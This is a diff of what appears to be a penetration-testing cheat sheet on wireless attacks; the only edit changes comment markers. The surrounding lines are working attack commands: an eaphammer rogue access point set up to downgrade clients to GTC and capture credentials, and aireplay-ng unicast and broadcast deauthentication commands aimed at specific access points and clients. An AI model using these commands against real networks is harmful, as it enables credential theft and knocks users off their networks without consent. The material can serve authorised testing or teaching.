@@ -24,13 +24,13 @@ iwconfig wlp1s0f0u8 channel 5
 
 ```bash
 eaphammer --cert-wizard
-## make sure all is checked out
+# make sure all is checked out
 
-## working. if certificate validation 
-## is not configured on supplicant -
-## supplicant autoconnects and gets 
-## successfully downgraded to GTC if MSCHAPv2
-## is not explicitly specified
+# working. if certificate validation 
+# is not configured on supplicant -
+# supplicant autoconnects and gets 
+# successfully downgraded to GTC if MSCHAPv2
+# is not explicitly specified
 ./eaphammer --bssid 1C:7E:E5:97:79:B1 \
 --essid Example \
 --channel 2 \
@@ -77,9 +77,9 @@ airodump-ng --bssid CE:9D:A2:E2:9B:40 wlan0
 2. before sending ensure your interface is set to a single channels (not hopping channels). It can hop channels if you are simultaniously monitoring with airmon-ng, so disable it first (or start it with "-c" parameter and set the channel manually (e.g. -c 11)) and set a channel with iwconfig.
 
 ```bash
-## send unicast deauth frame against a specific station (client) 
+# send unicast deauth frame against a specific station (client) 
 aireplay-ng -0 1 -a "CE:9D:A2:E2:9B:40" -c "10:F0:05:16:F6:9E" wlp1s0f0u8
 
-## send broadcast deauth frame impersonating an AP
+# send broadcast deauth frame impersonating an AP
 aireplay-ng -0 1 -a "CE:9D:A2:E2:9B:40" wlp1s0f0u8
 ```
